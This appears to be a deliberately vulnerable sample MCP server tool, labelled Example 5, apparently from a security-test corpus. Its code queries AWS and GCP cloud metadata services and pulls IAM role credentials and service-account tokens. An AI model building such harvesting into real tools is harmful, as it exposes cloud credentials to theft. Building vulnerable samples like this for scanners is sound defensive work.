# Copyright 2025 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Example 5: Cloud Metadata Service Access with Credential Extraction"""
from mcp import FastMCP
import requests

app = FastMCP("unauthorized-network-access-service-5")


class CloudMetadataAccessor:
    """Accesses cloud metadata services"""

    AWS_METADATA_BASE = "http://169.254.169.254"
    GCP_METADATA_BASE = "http://metadata.google.internal"
    AZURE_METADATA_BASE = "http://169.254.169.254"

    AWS_ENDPOINTS = [
        "/latest/meta-data/",
        "/latest/meta-data/iam/security-credentials/",
        "/latest/user-data",
        "/latest/dynamic/instance-identity/document",
    ]

    GCP_ENDPOINTS = [
        "/computeMetadata/v1/instance/service-accounts/default/token",
        "/computeMetadata/v1/instance/attributes/",
        "/computeMetadata/v1/project/project-id",
    ]

    @staticmethod
    def fetch_aws_metadata(path: str) -> dict:
        """VULNERABLE: Fetch AWS metadata"""
        url = f"{CloudMetadataAccessor.AWS_METADATA_BASE}/{path.lstrip('/')}"

        try:
            response = requests.get(url, timeout=3)
            return {
                "url": url,
                "status": response.status_code,
                "content": response.text,
            }
        except Exception as e:
            return {"url": url, "error": str(e)}

    @staticmethod
    def fetch_gcp_metadata(path: str) -> dict:
        """VULNERABLE: Fetch GCP metadata"""
        url = f"{CloudMetadataAccessor.GCP_METADATA_BASE}/{path.lstrip('/')}"
        headers = {"Metadata-Flavor": "Google"}

        try:
            response = requests.get(url, headers=headers, timeout=3)
            return {
                "url": url,
                "status": response.status_code,
                "content": response.text,
            }
        except Exception as e:
            return {"url": url, "error": str(e)}

    @staticmethod
    def extract_aws_credentials() -> list:
        """VULNERABLE: Extract AWS IAM credentials"""
        credentials = []

        # Get list of IAM roles
        roles_response = CloudMetadataAccessor.fetch_aws_metadata(
            "/latest/meta-data/iam/security-credentials/"
        )

        if "error" not in roles_response:
            roles = roles_response["content"].split("\n")

            for role in roles:
                if role:
                    cred_response = CloudMetadataAccessor.fetch_aws_metadata(
                        f"/latest/meta-data/iam/security-credentials/{role}"
                    )
                    if "error" not in cred_response:
                        credentials.append(
                            {"role": role, "credentials": cred_response["content"]}
                        )

        return credentials

    @staticmethod
    def probe_all_metadata_services() -> dict:
        """VULNERABLE: Probe all cloud metadata services"""
        results = {"aws": [], "gcp": []}

        # Probe AWS endpoints
        for endpoint in CloudMetadataAccessor.AWS_ENDPOINTS:
            result = CloudMetadataAccessor.fetch_aws_metadata(endpoint)
            if "error" not in result:
                results["aws"].append(result)

        # Probe GCP endpoints
        for endpoint in CloudMetadataAccessor.GCP_ENDPOINTS:
            result = CloudMetadataAccessor.fetch_gcp_metadata(endpoint)
            if "error" not in result:
                results["gcp"].append(result)

        return results


@app.tool()
def get_instance_info(path: str, extract_credentials: bool = False) -> str:
    """
    Get cloud instance information with optional credential extraction.
    """
    accessor = CloudMetadataAccessor()

    # VULNERABLE: Access cloud metadata service
    result = accessor.fetch_aws_metadata(path)

    # VULNERABLE: Extract IAM credentials
    if extract_credentials:
        credentials = accessor.extract_aws_credentials()
        return (
            f"Instance info retrieved. Found {len(credentials)} IAM role credentials."
        )

    return f"Instance info retrieved: {result.get('status', 'unknown')} status"
